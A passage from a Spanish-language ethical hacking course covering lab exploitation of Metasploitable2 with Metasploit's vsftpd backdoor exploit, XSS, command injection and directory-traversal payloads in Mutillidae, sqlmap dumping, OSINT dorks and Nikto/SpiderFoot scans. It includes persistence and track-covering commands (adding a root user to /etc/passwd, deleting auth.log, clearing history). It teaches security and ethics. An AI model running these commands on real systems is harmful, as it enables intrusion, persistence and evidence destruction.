Desde Kali, abre terminal y escribe:

```bash
ping 192.168.1.105
```

(Suponiendo que Metasploitable tiene esa IP, puedes verla con `ifconfig` en Metasploitable)

---

### üß™ EJEMPLO COMPLETO: Explotar una vulnerabilidad con Metasploit

üéØ **Objetivo**: Usar Metasploit desde Kali para atacar a Metasploitable2.

---

#### Paso 1: Escanear puertos con Nmap

```bash
nmap -sS -sV 192.168.1.105
```

Salida t√≠pica:

```
PORT     STATE SERVICE    VERSION
21/tcp   open  ftp        vsftpd 2.3.4
22/tcp   open  ssh        OpenSSH 4.7p1
...
```

> El FTP `vsftpd 2.3.4` es **vulnerable** a ejecuci√≥n remota.

---

#### Paso 2: Abrir Metasploit en Kali

```bash
msfconsole
```

---

#### Paso 3: Buscar exploit para vsftpd 2.3.4

```bash
search vsftpd
```

Resultado:

```
exploit/unix/ftp/vsftpd_234_backdoor
```

---

#### Paso 4: Usar el exploit

```bash
use exploit/unix/ftp/vsftpd_234_backdoor
```

---

#### Paso 5: Configurar la IP de la v√≠ctima

```bash
set RHOSTS 192.168.1.105
```

---

#### Paso 6: Ejecutar el ataque

```bash
run
```

Resultado:

```
[*] Command shell session opened!
```

¬°Tienes una **shell remota** sobre el sistema Metasploitable!

---

#### Paso 7: Explorar el sistema

Ya puedes escribir comandos como si estuvieras dentro del sistema:

```bash
whoami
ls
uname -a
```

---

### üß† ¬øQu√© aprendiste?

- C√≥mo instalar **Metasploitable2**.
- C√≥mo escanearlo con **Nmap**.
- C√≥mo explotarlo con **Metasploit**.
- Que **un servicio obsoleto (FTP)** puede permitir acceso total a un atacante.

---

### üõ°Ô∏è ¬øC√≥mo se previenen estos ataques?

| Ataque usado          | Prevenci√≥n                                                   |
| --------------------- | ------------------------------------------------------------ |
| FTP vulnerable        | Usar versiones actualizadas, cifradas y cerradas al p√∫blico. |
| Exposici√≥n de puertos | Usar firewalls y escaneo preventivo (como Nessus).           |
| Acceso remoto         | Seguir el principio de m√≠nimo privilegio.                    |

---

### üìö Recursos para seguir practicando

| Recurso                 | Enlace                                                                                               |
| ----------------------- | ---------------------------------------------------------------------------------------------------- |
| Metasploitable2         | [https://sourceforge.net/projects/metasploitable/](https://sourceforge.net/projects/metasploitable/) |
| Curso pr√°ctico          | [https://tryhackme.com](https://tryhackme.com)                                                       |
| Metasploit gu√≠a oficial | [https://docs.rapid7.com/metasploit/](https://docs.rapid7.com/metasploit/)                           |

---

[üîº](#√≠ndice)

---

## **865. Pr√°ctica: Cross-Site-Scripting, command injection y directorio transversal**

### üß† 1. ¬øQu√© es Cross-Site Scripting (XSS)?

#### ‚ùì Definici√≥n:

Es una vulnerabilidad que permite al atacante **inyectar scripts maliciosos (JavaScript)** en p√°ginas web que otros usuarios ver√°n.

> Esto puede permitir robar cookies, sesiones o redirigir usuarios a sitios falsos.

---

#### üß™ Ejemplo sencillo de XSS:

Si un formulario permite escribir tu nombre y devuelve:

```html
Hola <tu_nombre></tu_nombre>
```

Y t√∫ escribes:

```html
<script>
  alert("¬°Hackeado!");
</script>
```

Y la p√°gina muestra:

```html
Hola
<script>
  alert("¬°Hackeado!");
</script>
```

Entonces se ejecuta el `alert()` ‚áí Esto es un XSS.

---

### üß† 2. ¬øQu√© es Command Injection?

#### ‚ùì Definici√≥n:

Es cuando un atacante **inyecta comandos del sistema operativo** en formularios web mal protegidos.

> Esto puede permitir ejecutar `ls`, `cat`, `rm`, etc. en el servidor.

---

#### üß™ Ejemplo b√°sico de Command Injection:

Si hay un campo que dice "Ingresa una IP para hacer ping", y t√∫ escribes:

```bash
127.0.0.1; ls
```

Y el servidor ejecuta:

```bash
ping 127.0.0.1; ls
```

Entonces mostrar√° archivos del servidor ‚áí Esto es Command Injection.

---

### üß† 3. ¬øQu√© es Directory Traversal (Recorrido de directorios)?

#### ‚ùì Definici√≥n:

Es una vulnerabilidad que permite al atacante **navegar fuera del directorio web permitido** y acceder a archivos sensibles.

---

#### üß™ Ejemplo simple:

La URL:

```
http://victima.com/ver_archivo.php?file=manual.txt
```

Si cambias el par√°metro a:

```
file=../../../../etc/passwd
```

Podr√≠as ver el archivo `/etc/passwd` del sistema ‚áí Esto es Directory Traversal.

---

### ‚úÖ Instalaci√≥n del entorno de pruebas: Mutillidae

Ya que Mutillidae incluye todas estas vulnerabilidades, usaremos **Kali Linux** + **Mutillidae**.

---

#### üîπ Paso 1: Instala Apache, PHP y Git en Kali Linux

```bash
sudo apt update
sudo apt install apache2 php php-mysqli git mariadb-server -y
```

---

#### üîπ Paso 2: Clona Mutillidae

```bash
cd /var/www/html
sudo git clone https://github.com/webpwnized/mutillidae.git
sudo chown -R www-data:www-data mutillidae
```

---

#### üîπ Paso 3: Inicia Apache y MariaDB

```bash
sudo systemctl start apache2
sudo systemctl start mariadb
```

---

#### üîπ Paso 4: Configura la base de datos

Accede desde el navegador en Kali:

```
http://localhost/mutillidae
```

Haz clic en **"Setup/Reset the DB"** para inicializar la base de datos.

---

#### üîπ Paso 5: Baja la seguridad para practicar

En el men√∫ izquierdo de Mutillidae:

```
Toggle Hints ‚ûú Yes
Toggle Security ‚ûú Set to Low
```

---

### üß™ EJEMPLOS COMPLETOS

---

#### ‚úÖ EJEMPLO 1: XSS (Cross-Site Scripting)

1. En el men√∫ izquierdo:
   `OWASP Top 10 ‚ûú A7 - XSS ‚ûú Reflected (GET)`
   URL:

   ```
   http://localhost/mutillidae/index.php?page=xss-reflected.php
   ```

2. En el campo de texto, escribe:

```html
<script>
  alert("XSS funcionando");
</script>
```

3. Presiona ‚ÄúGo‚Äù y ver√°s una ventana emergente.

‚úÖ **Exploit exitoso de XSS Reflejado**

---

#### ‚úÖ EJEMPLO 2: Command Injection

1. En el men√∫:
   `OWASP Top 10 ‚ûú A1 - Injection ‚ûú OS Command Injection`

2. Ver√°s un campo para ingresar una direcci√≥n IP. Escribe:

```bash
127.0.0.1; ls
```

3. Haz clic en ‚ÄúPing‚Äù.

Ver√°s la salida del ping **m√°s un listado de archivos del servidor web**. ¬°Eso significa que pudiste ejecutar comandos!

‚úÖ **Command Injection exitoso**

---

#### ‚úÖ EJEMPLO 3: Directory Traversal

1. En el men√∫:
   `OWASP Top 10 ‚ûú A5 - Security Misconfiguration ‚ûú Directory Browsing`

2. URL del ejemplo:

```
http://localhost/mutillidae/index.php?page=directory-traversal.php
```

3. En el campo de archivo, escribe:

```bash
../../../../etc/passwd
```

4. Presiona ‚ÄúSubmit‚Äù

Ver√°s el contenido del archivo `/etc/passwd`, que contiene usuarios del sistema Linux.

‚úÖ **Directory Traversal exitoso**

---

### üß† ¬øQu√© aprendiste?

- **XSS** permite ejecutar scripts en el navegador de otros.
- **Command Injection** permite ejecutar comandos del sistema en el servidor.
- **Directory Traversal** permite leer archivos sensibles fuera del directorio web.

---

### üõ°Ô∏è ¬øC√≥mo se protegen estas vulnerabilidades?

| Vulnerabilidad      | Protecci√≥n recomendada                                                                |
| ------------------- | ------------------------------------------------------------------------------------- |
| XSS                 | Escapar y sanitizar entradas (HTML entities).                                         |
| Command Injection   | Validar entradas y usar funciones seguras (`escapeshellcmd`, `parametrizaci√≥n`).      |
| Directory Traversal | Validar rutas, usar `realpath()`, restringir el acceso fuera de carpetas espec√≠ficas. |

---

### üìö Recursos para seguir practicando

- üß™ [https://tryhackme.com](https://tryhackme.com)
- üß™ [https://owasp.org/www-project-mutillidae-ii/](https://owasp.org/www-project-mutillidae-ii/)
- üíª Curso gratuito de OWASP: [https://owasp.org/Top10/](https://owasp.org/Top10/)

---

[üîº](#√≠ndice)

---

## **866. Fases del hacking**

![Fases del hacking*](../img/7_Ciberseguridad_Profesional/Fases_del_hacking.webp "Fases del hacking*")

### üß† ¬øQu√© son las fases del hacking?

Las **fases del hacking** son los pasos que sigue un hacker √©tico (o malicioso) para **comprometer un sistema** o **evaluar su seguridad**.

Estas fases son parte de una **metodolog√≠a estructurada**, que permite:

- Identificar vulnerabilidades
- Explorar vectores de ataque
- Obtener acceso no autorizado
- Mantener el acceso
- Borrar evidencias

---

### üß≠ Las 5 fases del hacking √©tico

---

#### üîç 1. **Reconocimiento (Reconnaissance)**

Es la **fase de recolecci√≥n de informaci√≥n**. Aqu√≠ el atacante busca obtener toda la informaci√≥n posible del objetivo **sin interactuar directamente** con √©l (pasiva) o **interactuando directamente** (activa).

##### Ejemplos:

- B√∫squeda de IPs, dominios, subdominios, correos.
- Informaci√≥n p√∫blica en redes sociales o sitios web.
- Whois, Google hacking, DNSdumpster, Shodan.

##### Herramientas:

- `whois`, `nslookup`, `theHarvester`, `recon-ng`

---

#### üåê 2. **Escaneo (Scanning)**

Aqu√≠ el atacante **detecta puertos abiertos, servicios y sistemas operativos**. Es como "mapear" el sistema objetivo.

##### Ejemplos:

- Escanear puertos abiertos en una IP.
- Detectar si hay un servidor web, FTP o SSH funcionando.
- Identificar vulnerabilidades en servicios detectados.

##### Herramientas:

- `nmap`, `masscan`, `nikto`, `OpenVAS`

---

#### üéØ 3. **Acceso (Gaining Access)**

El atacante **explota vulnerabilidades** descubiertas en la fase de escaneo para **tomar el control del sistema o aplicaci√≥n**.

##### Ejemplos:

- Inyecci√≥n SQL para obtener contrase√±as.
- Explotar un servicio vulnerable con Metasploit.
- XSS para robar sesiones.

##### Herramientas:

- `Metasploit`, `sqlmap`, `burp suite`, `hydra`, `exploit-db`

---

#### üõ†Ô∏è 4. **Mantener el acceso (Maintaining Access)**

Una vez dentro, el atacante busca **mantener el acceso** para seguir explotando el sistema.

##### Ejemplos:

- Crear un usuario oculto.
- Instalar una puerta trasera (backdoor).
- Usar un rootkit o shell persistente.

##### Herramientas:

- `netcat`, `msfvenom`, `backdoor-apk`, `persistence scripts`

---

#### üßπ 5. **Cubrir rastros (Clearing Tracks)**

El atacante borra evidencias de su presencia para **evitar ser detectado**.

##### Ejemplos:

- Borrar logs del sistema (`/var/log/auth.log`)
- Modificar timestamps de archivos.
- Eliminar shells o scripts usados.

##### Herramientas:

- Comandos de Linux (`shred`, `rm`, `touch`), `Metasploit`, `logcleaner`

---

### üîß Instalaci√≥n de herramientas para cada fase (en Kali Linux)

Kali ya viene con muchas herramientas preinstaladas, pero puedes asegurarte de tener:

```bash
sudo apt update && sudo apt install nmap sqlmap metasploit-framework hydra theharvester nikto -y
```

---

### ‚úÖ EJEMPLO COMPLETO PASO A PASO

üéØ **Objetivo:** Hacer un mini pentest a una m√°quina virtual vulnerable llamada **Metasploitable 2** (puedes usar VirtualBox o VMware).

---

#### üë£ Paso 1: Reconocimiento

```bash
theharvester -d metasploitable.local -l 100 -b all
```

> üîç Obtiene correos, hosts, y nombres p√∫blicos.

---

#### üë£ Paso 2: Escaneo

```bash
nmap -sS -sV -O 192.168.56.101
```

> üîç Detecta puertos abiertos y servicios. Por ejemplo, FTP, SSH, MySQL, Apache.

---

#### üë£ Paso 3: Acceso

Detectas que el servicio FTP (puerto 21) **permite acceso an√≥nimo**:

```bash
ftp 192.168.56.101
# Usuario: anonymous
```

¬°Ya est√°s dentro del sistema!

---

O encuentras una vulnerabilidad en un servicio con Metasploit:

```bash
msfconsole
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOST 192.168.56.101
run
```

‚úÖ Obtienes una shell como root.

---

#### üë£ Paso 4: Mantener el acceso

```bash
netcat -lvp 4444 > shell.sh
```

O subes un script para crear un usuario:

```bash
echo "user:x:0:0::/root:/bin/bash" >> /etc/passwd
```

---

#### üë£ Paso 5: Cubrir rastros

```bash
rm -f /var/log/auth.log
history -c
```

---

### üõ°Ô∏è Recuerda: ¬°Solo practicar en entornos controlados!

**Nunca hagas pruebas en redes o sitios que no sean tuyos o no tengas autorizaci√≥n.**
Hazlo en laboratorios como:

- üîê [Metasploitable 2](https://sourceforge.net/projects/metasploitable/)
- üîê [TryHackMe](https://tryhackme.com/)
- üîê [Hack The Box](https://www.hackthebox.com/)

---

### üß† Resumen gr√°fico de las fases

```
1Ô∏è‚É£ Reconocimiento  ‚Üí  2Ô∏è‚É£ Escaneo  ‚Üí  3Ô∏è‚É£ Acceso  ‚Üí  4Ô∏è‚É£ Persistencia  ‚Üí  5Ô∏è‚É£ Cubrir Huellas
```

---

[üîº](#√≠ndice)

---

## **867. Tipos de hacking**

### üß† ¬øQu√© es el hacking?

El **hacking** es el proceso de **manipular sistemas inform√°ticos** para lograr un objetivo determinado. Dependiendo de la **intenci√≥n** del hacker, el hacking puede ser **√©tico (legal)** o **malicioso (ilegal)**.

---

### üéØ Tipos de hacking (seg√∫n el "sombrero" del hacker)

Los hackers se clasifican com√∫nmente por **colores de sombrero**, como si fueran personajes en una historia:

---

#### üü¢ 1. Hacker de sombrero blanco (White Hat)

- **Son los hackers √©ticos.**
- Usan sus habilidades para **proteger sistemas**, detectar vulnerabilidades y ayudar a empresas.
- Trabajan como **pentesters, analistas de seguridad, investigadores**.
- Act√∫an **con autorizaci√≥n legal**.

üìå **Ejemplo**:

- Un especialista en seguridad contratado para hackear un sistema y encontrar debilidades antes de que lo haga un atacante real.

---

#### ‚ö´ 2. Hacker de sombrero negro (Black Hat)

- Son los hackers **maliciosos**.
- Buscan **robar datos, da√±ar sistemas, extorsionar, instalar malware, etc.**
- Act√∫an **ilegalmente y sin permiso**.

üìå **Ejemplo**:

- Un atacante que entra a una base de datos y roba n√∫meros de tarjetas de cr√©dito para venderlos en la dark web.

---

#### ‚ö™‚ö´ 3. Hacker de sombrero gris (Grey Hat)

- Est√°n **en medio** de los anteriores.
- Pueden vulnerar sistemas **sin autorizaci√≥n**, pero **sin intenci√≥n maliciosa**.
- A veces informan al due√±o del sistema. Otras veces, piden una recompensa.

üìå **Ejemplo**:

- Un hacker que encuentra una falla en un sistema y notifica al due√±o, pero sin permiso previo.

---

#### üü† 4. Hacktivista

- Utiliza el hacking con **fines pol√≠ticos o sociales**.
- Sus acciones pueden ser legales o ilegales seg√∫n el caso.
- Objetivo: **protestar, denunciar o defender una causa**.

üìå **Ejemplo**:

- Grupo Anonymous atacando sitios de gobiernos o empresas que consideran corruptas o injustas.

---

#### üíª 5. Script Kiddie

- Hackers **sin conocimientos profundos**.
- Usan herramientas y scripts creados por otros.
- Buscan fama o diversi√≥n sin saber bien lo que hacen.

üìå **Ejemplo**:

- Alguien que descarga un programa de "hacking de Facebook" y lo ejecuta sin entender c√≥mo funciona.

---

#### üë©‚Äçüíª 6. Hacker de sombrero azul (Blue Hat)

- Hackers que **vengan una ofensa personal**, o **testean sistemas de seguridad** antes del lanzamiento (a veces confundido con el red team externo).
- En algunos casos trabajan para empresas en **bug bounty**.

üìå **Ejemplo**:

- Un hacker contratado para probar la seguridad de una app antes de su salida oficial.

---

#### üîµ 7. Hacker de sombrero rojo (Red Hat)

- Act√∫an como **White Hats**, pero con una actitud m√°s **agresiva y ofensiva** contra Black Hats.
- Su objetivo: **detener a los hackers maliciosos**, incluso hacke√°ndolos de vuelta.

üìå **Ejemplo**:

- Un experto en seguridad que encuentra un servidor de un atacante y lo inhabilita.

---

### üß™ ¬øC√≥mo instalar un entorno para practicar hacking √©tico?

Usaremos **Kali Linux** en VirtualBox, ya que Kali es la distro m√°s usada por hackers √©ticos.

---

#### ‚úÖ Requisitos:

- [ ] PC con al menos 4GB RAM y 20GB libres.
- [ ] VirtualBox instalado (o VMware).
- [ ] Imagen ISO de Kali Linux:
      üîó [https://www.kali.org/get-kali/](https://www.kali.org/get-kali/)

---

#### ‚úÖ Pasos para instalar Kali Linux en VirtualBox:

1. **Descarga Kali ISO** desde el sitio oficial.
2. Abre VirtualBox ‚Üí "Nueva m√°quina virtual".
3. Asigna:

   - Nombre: Kali
   - Tipo: Linux
   - Versi√≥n: Debian 64-bit
   - RAM: al menos 2 GB
   - Disco duro: 20 GB (tipo VDI, reservado din√°micamente)

4. Monta la ISO de Kali y arranca la VM.
5. Sigue los pasos de instalaci√≥n de Kali como cualquier Linux.
6. Al iniciar sesi√≥n, ya tendr√°s acceso a herramientas como:

   - Nmap, Metasploit, Wireshark, Burp Suite, sqlmap, etc.

---

### ‚úÖ Ejemplo completo: White Hat vs Black Hat

Imaginemos una empresa con una aplicaci√≥n vulnerable llamada **Mutillidae** (instalada en Metasploitable 2).
Te contratan como hacker √©tico (White Hat) para **evaluar la seguridad del sitio web**.

---

#### üîπ Fase 1: Reconocimiento

```bash
whois empresa.com
nslookup empresa.com
```

---

#### üîπ Fase 2: Escaneo

```bash
nmap -sV -A 192.168.56.101
```

Encuentras puerto 80 abierto, servidor Apache.

---

#### üîπ Fase 3: Explotaci√≥n

Encuentras una **vulnerabilidad de inyecci√≥n SQL** en el login.

Con `sqlmap`:

```bash
sqlmap -u "http://192.168.56.101/mutillidae/index.php?page=login.php" --data="username=admin&password=123" --dump
```

Obtienes los usuarios y contrase√±as.

---

#### üîπ Fase 4: Reporte

T√∫ como hacker √©tico **documentas el hallazgo**, recomiendas sanitizar inputs y usar prepared statements.

‚úÖ **Hiciste un hacking legal (White Hat).**

Pero si en vez de eso **vendieras las contrase√±as en la dark web**, ser√≠as un hacker de sombrero negro (Black Hat).

---

### üõ°Ô∏è ¬øC√≥mo convertirte en hacker √©tico?

1. Aprende sobre redes, sistemas operativos, programaci√≥n.
2. Practica en laboratorios como:

   - [TryHackMe](https://tryhackme.com)
   - [Hack The Box](https://www.hackthebox.com)
   - M√°quinas vulnerables como Metasploitable y DVWA.

3. Estudia certificaciones como:

   - CEH (Certified Ethical Hacker)
   - OSCP (Offensive Security Certified Professional)

---

### üß† Resumen:

| Tipo de hacker   | Intenci√≥n         | Legalidad    | Ejemplo                         |
| ---------------- | ----------------- | ------------ | ------------------------------- |
| üü¢ White Hat     | √âtica             | Legal        | Pentester contratado            |
| ‚ö´ Black Hat     | Maliciosa         | Ilegal       | Ladr√≥n de datos                 |
| ‚ö™‚ö´ Grey Hat    | Mixta             | Depende      | Hackea sin permiso pero no da√±a |
| üü† Hacktivista   | Protesta          | Ilegal/legal | Anonymous                       |
| üßë‚Äçüíª Script Kiddie | Diversi√≥n         | Ilegal       | Usa scripts de otros sin saber  |
| üîµ Blue Hat      | Testeo o venganza | Depende      | Pruebas antes del lanzamiento   |
| üî¥ Red Hat       | Defensa ofensiva  | Mixta        | Hackea a los hackers            |

---

[üîº](#√≠ndice)

---

## **868. Pr√°ctica: Obteniendo informaci√≥n de fuentes abiertas con OSINT Framework y Google hacking**

### üîç ¬øQu√© es OSINT?

**OSINT (Open Source Intelligence)** es la recopilaci√≥n de informaci√≥n p√∫blica y gratuita, accesible legalmente, para analizar personas, empresas, dominios, redes sociales, etc.

#### Ejemplos de fuentes OSINT:

- Sitios web
- Redes sociales
- Google
- Dominios y registros DNS
- Noticias
- Foros y bases de datos p√∫blicas

---

### üéØ ¬øPara qu√© sirve OSINT?

- **Hacking √©tico / pentesting**: buscar informaci√≥n que pueda facilitar un ataque.
- **Ciberinvestigaci√≥n / forense digital**: rastrear estafadores, cibercriminales.
- **Investigaci√≥n empresarial o personal**: analizar competencia, reputaci√≥n, amenazas.
- **Ingenier√≠a social**: entender mejor a los objetivos antes de un ataque simulado.

---

### üß† Herramientas clave:

1. üï∏Ô∏è **OSINT Framework**
2. üîç **Google Hacking (Google Dorks)**

---

### üõ†Ô∏è Instalaci√≥n y uso de OSINT Framework

#### üîó ¬øQu√© es OSINT Framework?

Es un **sitio web organizado por categor√≠as** que enlaza a cientos de herramientas OSINT, para:

- Buscar correos
- Rastrear IPs
- Analizar redes sociales
- Investigar personas o empresas
- Buscar leaks y metadatos

#### ‚úÖ C√≥mo usarlo:

No requiere instalaci√≥n. Solo necesitas un navegador.

1. Ve a:
   üîó [https://osintframework.com/](https://osintframework.com/)

2. Explora por categor√≠as:

   - Username
   - E-mail address
   - Metadata
   - Social Networks
   - Domains
   - Leaks

3. Haz clic en cualquier opci√≥n. Por ejemplo:

   - **Username ‚Üí Knowem** te lleva a una web que busca ese usuario en m√°s de 100 redes sociales.

---

### üîç ¬øQu√© es Google Hacking o Google Dorks?

Son **comandos avanzados de b√∫squeda en Google** que te permiten encontrar informaci√≥n sensible u oculta que normalmente no aparecer√≠a.

#### ‚úÖ Ejemplos de Google Dorks:

| Dork                    | Qu√© hace                           |
| ----------------------- | ---------------------------------- |
| `site:example.com`      | Busca solo dentro de ese sitio     |
| `intitle:index.of`      | Muestra directorios abiertos       |
| `filetype:pdf`          | Busca solo archivos PDF            |
| `inurl:login`           | Busca URLs con la palabra login    |
| `ext:sql`               | Encuentra archivos `.sql`          |
| `password filetype:log` | Busca posibles contrase√±as en logs |

---

### ‚öôÔ∏è Entorno de pr√°ctica OSINT

No necesitas instalar nada pesado. Solo:

- ‚úÖ **Navegador web actualizado (Firefox, Chrome)**
- ‚úÖ Kali Linux (opcional, si quieres usar herramientas como theHarvester o Maltego)
- ‚úÖ Acceso a Internet

---

### üß™ Ejemplo completo de pr√°ctica OSINT

#### üéØ Objetivo: Obtener informaci√≥n p√∫blica sobre un dominio y su due√±o.

---

#### üß© Paso 1: Elegir un objetivo

Vamos a investigar el dominio ficticio:
`example.com`

> ‚ö†Ô∏è Para practicar con un dominio real, escoge uno de tu propiedad o autorizado. No hagas esto sin permiso.

---

#### üîé Paso 2: Usar Google Hacking (Google Dorks)

Abre Google y busca:

```bash
site:example.com
```

‚Üí Muestra todas las p√°ginas indexadas del sitio.

```bash
site:example.com filetype:pdf
```

‚Üí Encuentra archivos PDF p√∫blicos en el sitio.

```bash
inurl:admin site:example.com
```

‚Üí Intenta encontrar paneles de administraci√≥n p√∫blicos.

```bash
intitle:index.of site:example.com
```

‚Üí Busca directorios abiertos que podr√≠an contener archivos sin protecci√≥n.

---

#### üß© Paso 3: Usar OSINT Framework

Ve a: [https://osintframework.com/](https://osintframework.com/)

Explora:

1. **Domain Names ‚Üí WHOIS Records**

   - Selecciona `ViewDNS.info` o `Whois.domaintools.com`
   - Escribe `example.com` y obt√©n informaci√≥n como:

     - Registrante
     - Correo asociado
     - Servidores DNS
     - IP del servidor

2. **Metadata ‚Üí Document Metadata**

   - Usa herramientas como `metagoofil` (en Kali) para buscar documentos con metadatos.

3. **Social Networks ‚Üí LinkedIn**

   - Busca perfiles que trabajen en la empresa para posibles objetivos de ingenier√≠a social.

---

#### üß© Paso 4: Complementar con herramientas de Kali Linux (opcional)

üîß **theHarvester**: recolecta correos, subdominios, nombres, etc.

```bash
theHarvester -d example.com -b google
```

üîß **dnsenum**: enumera informaci√≥n DNS de un dominio.

```bash
dnsenum example.com
```

üîß **maltego** (requiere GUI): an√°lisis visual de relaciones OSINT.

---

#### ‚úÖ Resultado

Con solo herramientas p√∫blicas y legales, puedes obtener:

- Correos visibles asociados a la empresa
- Documentos mal expuestos
- Subdominios visibles
- Metadatos en archivos PDF o DOC
- Nombres de empleados en LinkedIn
- Paneles o formularios mal protegidos

Todo esto **sin tocar el sistema del objetivo**. Solo viendo lo que ya est√° p√∫blicamente expuesto.

---

### üõ°Ô∏è ¬øQu√© se aprende con esta pr√°ctica?

‚úîÔ∏è Lo peligroso que puede ser publicar cosas sin control

‚úîÔ∏è C√≥mo el atacante prepara sus vectores con OSINT

‚úîÔ∏è Que la **informaci√≥n p√∫blica puede ser usada para ataques dirigidos**

‚úîÔ∏è Que un **White Hat** puede usar OSINT para prevenir brechas

---

### üß† ¬øY ahora qu√©?

Si quieres seguir con pr√°cticas OSINT m√°s avanzadas:

üîó [https://tryhackme.com/room/introductiontointelligence](https://tryhackme.com/room/introductiontointelligence)

üîó [https://www.hackthebox.com/](https://www.hackthebox.com/)

üîó [https://osintdojo.com/](https://osintdojo.com/)

---

[üîº](#√≠ndice)

---

## **869. Pr√°ctica: Analizar un sitio web con Nikto y Spiderfoot**

### üß† ¬øQu√© es Nikto?

**Nikto** es un esc√°ner de vulnerabilidades web en l√≠nea de comandos.
Sirve para detectar problemas en servidores web como:

- Archivos y directorios inseguros
- Errores de configuraci√≥n del servidor
- Scripts antiguos y vulnerables
- Cabeceras mal configuradas
- Software obsoleto (como Apache, PHP, etc.)

---

### ‚öôÔ∏è Instalaci√≥n de Nikto (en Kali Linux o cualquier Linux)

En **Kali Linux**, **ya viene instalado por defecto**.
Si no lo tienes, inst√°lalo as√≠:

```bash
sudo apt update
sudo apt install nikto -y
```

Verifica con:

```bash
nikto -Version
```

---

### üß† ¬øQu√© es SpiderFoot?

**SpiderFoot** es una herramienta de **OSINT automatizado**, que:

- Recolecta informaci√≥n sobre un dominio, IP, persona o empresa
- Usa +200 fuentes de datos (Shodan, VirusTotal, Whois, etc.)
- Puede detectar correos filtrados, puertos abiertos, tecnolog√≠as usadas, etc.

---

### ‚öôÔ∏è Instalaci√≥n de SpiderFoot

#### Opci√≥n 1: Ya instalado en Kali Linux

Ejecuta:

```bash
spiderfoot
```

Si no se ejecuta, inst√°lalo as√≠ üëá

#### Opci√≥n 2: Instalar manualmente desde GitHub

1. Clona el repositorio:

```bash
git clone https://github.com/smicallef/spiderfoot.git
cd spiderfoot
```

2. Instala los requisitos:

```bash
sudo apt install python3-pip
pip3 install -r requirements.txt
```

3. Ejecuta SpiderFoot en modo web:

```bash
python3 sf.py
```

Luego abre tu navegador y ve a:

üìç `http://127.0.0.1:5001`

---

### üîç EJEMPLO COMPLETO: Analizar un sitio web con Nikto y SpiderFoot

Usaremos el sitio **[http://testphp.vulnweb.com](http://testphp.vulnweb.com)**, un sitio creado para pr√°cticas legales.

---

#### üîπ PARTE 1: Escaneo con Nikto

Ejecuta en terminal:

```bash
nikto -h http://testphp.vulnweb.com
```

Ver√°s una salida como:

```
+ Server: Apache/2.2.8 (Ubuntu) PHP/5.2.4-2ubuntu5
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ Apache/2.2.8 appears to be outdated.
+ Retrieved x-powered-by header: PHP/5.2.4-2ubuntu5
+ OSVDB-3092: /admin/: This might be an administrative login page.
...
```

#### üß† ¬øQu√© detect√≥ Nikto?

- El servidor usa versiones obsoletas de Apache y PHP
- Faltan cabeceras de seguridad
- Hay un `/admin/` que puede usarse para ataques de fuerza bruta
- Potenciales vulnerabilidades conocidas (OSVDB)

---

#### üîπ PARTE 2: Escaneo con SpiderFoot

1. Abre SpiderFoot:

```bash
cd spiderfoot
python3 sf.py
```

2. Abre tu navegador y entra a:

```
http://127.0.0.1:5001
```

3. Crea un nuevo escaneo:

- Nombre: `Prueba sitio vulnerable`
- Target: `testphp.vulnweb.com`
- Marca ‚Äúuse all modules‚Äù y presiona **Run Scan**

4. Espera unos minutos y revisa los resultados.

---

#### üìä SpiderFoot te mostrar√°:

- Direcci√≥n IP del dominio
- Informaci√≥n del servidor
- Subdominios relacionados
- Emails expuestos
- Rutas detectadas
- Problemas de configuraci√≥n
- Detalles de registros DNS, WHOIS, ASN
- Enlaces filtrados en servicios OSINT

---

### üß† ¬øQu√© aprendiste con esta pr√°ctica?

‚úÖ Con **Nikto** detectaste configuraciones inseguras y versiones obsoletas

‚úÖ Con **SpiderFoot** recolectaste informaci√≥n OSINT detallada

‚úÖ Ambos te ayudan a hacer un **reconocimiento inicial completo**

---

### üõ°Ô∏è ¬øC√≥mo proteger un sitio contra esto?

- Usar **cabeceras de seguridad**: X-Frame-Options, X-XSS-Protection, Content-Security-Policy
- Mantener el software actualizado (Apache, PHP, WordPress, etc.)
- Evitar dejar rutas como `/admin/` expuestas
- Usar WAF y autenticaci√≥n robusta

---

### üìö Recursos extra

| Herramienta        | Enlace                                                                             |
| ------------------ | ---------------------------------------------------------------------------------- |
| SpiderFoot         | [https://github.com/smicallef/spiderfoot](https://github.com/smicallef/spiderfoot) |
| Nikto              | [https://github.com/sullo/nikto](https://github.com/sullo/nikto)                   |
| Sitio para pruebas | [http://testphp.vulnweb.com](http://testphp.vulnweb.com)                           |

---

[üîº](#√≠ndice)

---

## **870. ¬øEs necesario un hacking √©tico? Hacking √©tico como profesi√≥n**

### ‚úÖ ¬øEs necesario el hacking √©tico?

#### üìå **S√≠, es absolutamente necesario**.

El **hacking √©tico** es una **disciplina de ciberseguridad** que consiste en **identificar y corregir vulnerabilidades** en sistemas inform√°ticos **antes de que lo hagan los atacantes maliciosos**.

#### üß† ¬øPor qu√© es importante?

Imagina que tienes una casa. ¬øDejar√≠as las puertas abiertas?
Un hacker √©tico ser√≠a como un **experto en seguridad** que **prueba todas las puertas y ventanas** para asegurarse de que est√©n bien cerradas.

---

### üî• ¬øQu√© puede pasar si no hay hacking √©tico?

#### Ejemplo real:

- En 2017, Equifax (una empresa financiera) **sufri√≥ una brecha de datos** donde robaron datos personales de m√°s de **147 millones de personas**.
- Todo por **una vulnerabilidad no corregida** en su servidor web (Apache Struts).

üí° **Un hacker √©tico habr√≠a podido detectar esa vulnerabilidad antes.**

---

### üë®‚Äçüíª ¬øQu√© hace un hacker √©tico?

1. Escanea sistemas y redes en busca de fallos.
2. Prueba contrase√±as d√©biles o servicios abiertos.
3. Intenta explotar vulnerabilidades de forma controlada.
4. Reporta todo lo que encuentra para que sea corregido.
5. A veces ayuda a definir pol√≠ticas de seguridad.

---

### üõ°Ô∏è ¬øCu√°l es la diferencia entre un hacker √©tico y uno malicioso?

| Hackers √âticos (White Hat) üßë‚Äçüíª     | Hackers Maliciosos (Black Hat) üïµÔ∏è‚Äç‚ôÇÔ∏è |
| --------------------------------- | --------------------------------- |
| Trabajan con permiso legal        | Atacan sin autorizaci√≥n           |
| Ayudan a proteger                 | Buscan robar o da√±ar              |
| Reportan fallos                   | Ocultan sus acciones              |
| Su trabajo es legal y bien pagado | Su trabajo es ilegal              |

---

### üíº Hacking √©tico como **profesi√≥n**

#### üåê ¬øD√≥nde trabajan los hackers √©ticos?

- Empresas de tecnolog√≠a y telecomunicaciones
- Bancos y aseguradoras
- Gobiernos y fuerzas armadas
